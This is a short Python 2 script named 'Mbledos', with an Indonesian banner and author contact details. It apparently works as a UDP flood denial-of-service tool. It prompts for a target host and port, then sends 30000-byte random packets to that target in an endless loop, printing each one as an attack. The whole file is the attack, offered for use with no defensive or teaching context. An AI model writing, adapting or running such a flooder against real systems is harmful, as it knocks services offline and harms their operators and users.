import time 

import datetime 

import socket 

import random 

import sys 

import os


os.system("clear")

os.system("figlet Mbledos")

time = time.ctime(time.time())

def main(): 
   
   print len(sys.argv) 
   
   if len(sys.argv) != 2: 
   
    print"\033[91m=========================================="
    print"\033[92mSELAMAT DATANG DI SC MBLEDOS"
    print" "
    print"\033[92m[INFO SC]"
    print" "
    print"\033[92mTahun rilis: 26 - 02 - 2019"
    print"\033[92mBahasa pemrograman: Python"
    print"\033[92mGitHub: https://github.com/RaphSoft/lain-lain.git"
    print"\033[91m=========================================="
    print" "
    print"\033[92mJika terjadi kesalahan pada program atau bug"
    print"          \033[92mDM atau laporkan ke:"
    print" "
    print"\033[92mFB: Om Telolet Om"
    print"\033[92mIG: yogadwiayudianto_34"
    print" "
    print("\033[94mWaktu sekarang:") ,time
    print" "
    
    ip = raw_input ("\033[95mMasukkan ip/host target:") 
    
    port = input ("Masukkan port: ") 
    
    bytes = input ("Masukkan bytes/paket:")
 
 
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
    
    bytes = random._urandom(30000) 
    
    sent = 0 
    
    while True: 
        
        sock.sendto(bytes, (ip, port)) 
        
        port = port + 0
        
        sent = sent + 1 
        
        print "\033[94mMenyerang \033[91m%s \033[94mdengan port \033[91m%s \033[94mbytes \033[91m%s"%(ip, port, sent)


if __name__ == '__main__': 
        
        main()
    
     
    
    
